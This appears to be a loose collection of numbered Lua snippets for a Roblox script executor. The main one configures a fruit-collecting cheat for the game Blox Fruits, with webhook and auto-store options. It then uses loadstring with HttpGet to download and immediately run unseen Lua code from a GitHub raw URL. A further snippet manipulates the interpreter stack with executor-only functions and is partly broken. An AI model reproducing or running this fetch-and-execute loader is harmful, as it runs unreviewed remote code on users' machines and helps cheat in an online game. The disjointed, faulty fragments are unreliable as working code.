1.writefile('status.json', 'False')
2.https://raw.githubusercontent.com/3bo3c0ewnj9hks/rororo/main/TBLOFFRUIT
3.getgenv().names = {"Spin Fruit", "Spike Fruit", "Chop Fruit"}
getgenv().usewebhook = true
getgenv().webhookurl = "" -- only use when using webhook
getgenv().autostore = true
loadstring(game:HttpGet('https://raw.githubusercontent.com/3bo3c0ewnj9hks/rororo/main/bro.lua'))()
4.local joe,l,c,cc,i, p
setstack(1, 1, {})
setstack(1, 1, {__index=getstack(1, 1)})
setstack(1, 2, {})
setstack(1, 3, clonefunction)
setstack(1, 4, newcclosure)
setstack(1, 5, c(table.insert))
setstack(1, 6, getstack(1,3)(print))
function joe.new()
  local y
  setstack(1, 1, {})
  y.Boom = function()
    return "Boom"
  end
  getstack(2, 5)(getstack(2, 2), getstack(1,1))
  return getstack(1, 1)
end
getstack(1,6)(getstack(1,1).new().Boom())